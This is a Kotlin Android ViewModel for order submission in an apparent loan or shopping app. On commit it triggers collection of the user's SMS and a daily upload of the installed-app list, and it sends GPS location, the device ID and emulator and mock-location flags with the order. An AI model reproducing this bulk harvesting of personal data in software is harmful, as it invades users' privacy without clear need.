package com.hc.load.vm

import androidx.fragment.app.FragmentActivity
import androidx.lifecycle.*
import androidx.navigation.Navigation
import com.blankj.utilcode.util.ToastUtils
import com.hc.data.mall.CheckOrder
import com.hc.data.mall.GoodsSx
import com.hc.load.R
import com.hc.load.collect.CollectLogicManage
import com.hc.load.collect.EmulatorCheck
import com.hc.load.epoch.utils.EpochLogicUtils
import com.hc.load.net.LoanInfoService
import com.hc.uicomponent.base.BaseViewModel
import com.hc.uicomponent.base.PageBase
import com.hc.uicomponent.call.reqApi
import com.hc.uicomponent.config.Constants
import com.hc.uicomponent.provider.ContextProvider
import com.hc.uicomponent.stack.ActivityStack
import com.hc.uicomponent.utils.FirseBaseEventUtils
import com.hc.uicomponent.utils.LocationUtils
import com.hc.uicomponent.utils.StatEventTypeName
import com.hc.uicomponent.utils.mmkv
import frame.utils.DateUtil
import frame.utils.DeviceUtil
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.*

class CommitOrderViewModel : BaseViewModel(), LifecycleObserver {
    private val extraLogicManage: CollectLogicManage = CollectLogicManage()
    var checkOrderData = MutableLiveData<CheckOrder>()
    var mGotoWaitingPage = MutableLiveData<String>()

    // 检验订单
    fun checkOrder(goodsPrice: Double, goodsId: String, isShowDialog: Boolean = false) {
        viewModelScope.launch {
            val checkOrderResult = reqApi(LoanInfoService::class.java, block = { checkOrder(goodsPrice, goodsId) }, isShowLoading = isShowDialog)
            checkOrderResult.data?.run {
                checkOrderData.value = this
            }
        }
    }

    fun commitOrder(goodsSx: GoodsSx) {
        if (checkOrderData.value?.epochNo?.isBlank() == true) {
            commitOrderFlow(goodsSx)
        } else {
            checkOrderData.value?.epochNo?.let {
                EpochLogicUtils.showEpochDialog()
                EpochLogicUtils.epochSynData(it)
                EpochLogicUtils.startEpochTimer(object : EpochLogicUtils.ISubmitOrderCallback {
                    override fun handlerSubmitOrder() {
                        EpochLogicUtils.hideEpochDialog()
                        commitOrderFlow(goodsSx)
                    }
                })
            }

        }
    }

    private fun commitOrderFlow(goodsSx: GoodsSx) {
        ActivityStack.currentActivity()?.let {
            if (!it.isFinishing && !it.isDestroyed) {
                if (it is PageBase) {
                    it.showLoadingDialog()
                }
            }
        }
        //收集SMS
        extraLogicManage.collectSmsInfo()
        taskJob = viewModelScope.launch {
            val isHasUploadAppList = mmkv().decodeBool(Constants.CUR_DAY_HAS_UPLOAD_APP_LIST, false)
            val curDate = DateUtil.getDate(Date())
            val lastDate = mmkv().decodeString(Constants.CUR_DAY_HAS_UPLOAD_APP_DATE, curDate)
            //控制当前有且仅提交一次APP列表数据
            if (isHasUploadAppList) {
                if (DateUtil.getBetweenDay(lastDate, curDate) > 0) {//next day
                    handleCollectAppDataAndCommitLogic {
                        //app list & commit order !
                        launch(Dispatchers.IO) {
                            handleUploadAppListAndOrderCommit(curDate, goodsSx, null)
                        }
                    }
                } else {
                    launch(Dispatchers.IO) {
                        handlerOrderCommit(goodsSx, null)//only commit order
                    }
                }
            } else {
                handleCollectAppDataAndCommitLogic {
                    //app list & commit order !
                    launch(Dispatchers.IO) {
                        handleUploadAppListAndOrderCommit(curDate, goodsSx, null) //app list & commit order !
                    }
                }
            }
        }
    }

    private suspend fun handleCollectAppDataAndCommitLogic(action: () -> Unit) {
        if (extraLogicManage.collectAppLogic.isHasCollectLoading()) {//判断是否已经收集完APP列表数据
            var downCount = 1
            while (downCount <= 5) {
                kotlinx.coroutines.delay(1000)
                if (extraLogicManage.collectAppLogic.isHasCollectLoading()) {
                    if (downCount == 5) {
                        ActivityStack.currentActivity()?.let {
                            if (!it.isFinishing && !it.isDestroyed) {
                                if (it is PageBase) {
                                    it.dismissLoadingDialog()
                                }
                            }
                        }
                        ToastUtils.showShort(R.string.dialog_mall_order_try_again)
                        return
                    }
                    downCount++
                } else {
                    break
                }
            }
            //执行提交数据逻辑&提交订单
            action()
        } else action()
    }

    private suspend fun handleUploadAppListAndOrderCommit(curDate: String, goodsSx: GoodsSx, blockBox: String?) {
        val uploadAppListResult = reqApi(LoanInfoService::class.java, { saveNativeAppList(extraLogicManage.collectAppLogic.getCollectAppInfo()) },
            callDone = {
                ActivityStack.currentActivity()?.let {
                    if (!it.isFinishing && !it.isDestroyed) {
                        if (it is PageBase) {
                            it.dismissLoadingDialog()
                        }
                    }
                }
            }
        )
        /** order handler request **/
        uploadAppListResult.code.run {
            if (this == Constants.NUMBER_200) {
                mmkv().encode(Constants.CUR_DAY_HAS_UPLOAD_APP_DATE, curDate)
                mmkv().encode(Constants.CUR_DAY_HAS_UPLOAD_APP_LIST, true)
                /** commit order **/
                handlerOrderCommit(goodsSx, blockBox)
            }
        }
    }

    private suspend fun handlerOrderCommit(goodsSx: GoodsSx, blockBox: String?) {
        FirseBaseEventUtils.trackEvent(StatEventTypeName.ORDER_COMMIT)
        val currentActivity = ActivityStack.currentActivity()
        val orderResult = reqApi(LoanInfoService::class.java, {
            val app = ContextProvider.app
            commitOrder(
                goodsSx.choseAmount.toString(),
                goodsSx.id, goodsSx.name, "",
                LocationUtils.getLatLng(),
                blockBox, DeviceUtil.getDeviceId(app),
                if (LocationUtils.isAllowMockLocation(app)) Constants.NUMBER_1 else Constants.NUMBER_0,
                if (EmulatorCheck.isEmulator(app)) Constants.NUMBER_1 else Constants.NUMBER_0
            )
        }, callDone = {
            currentActivity?.let {
                if (!it.isFinishing && !it.isDestroyed) {
                    if (it is PageBase) {
                        it.dismissLoadingDialog()
                    }
                }
            }
        })
        currentActivity?.runOnUiThread {
            //jump 2 order wait page .
            orderResult.data?.run {
                mGotoWaitingPage.value = this.id
            }
        }
    }

    @OnLifecycleEvent(Lifecycle.Event.ON_CREATE)
    fun onCreate(owner: LifecycleOwner) {
        //初始化Epoch
        EpochLogicUtils.initEpochSDk(ContextProvider.app)
        //[定位服务-初始化]
        ActivityStack.currentActivity()?.let {
            LocationUtils.getInstance().initLocation(ContextProvider.app,it as FragmentActivity)
        }
    }

    @OnLifecycleEvent(Lifecycle.Event.ON_RESUME)
     fun onResume(owner: LifecycleOwner) {
        ActivityStack.currentActivity()?.let {
            LocationUtils.getInstance().resetGpsLocationUpdates(ContextProvider.app)
        }
    }
    @OnLifecycleEvent(Lifecycle.Event.ON_STOP)
    fun onStop(owner: LifecycleOwner) {
        //[定位服务-暂停定位服务
        ActivityStack.currentActivity()?.let {
            LocationUtils.getInstance().stopLocationUpdates(it)
        }
        LocationUtils.getInstance().stopGps()
    }


}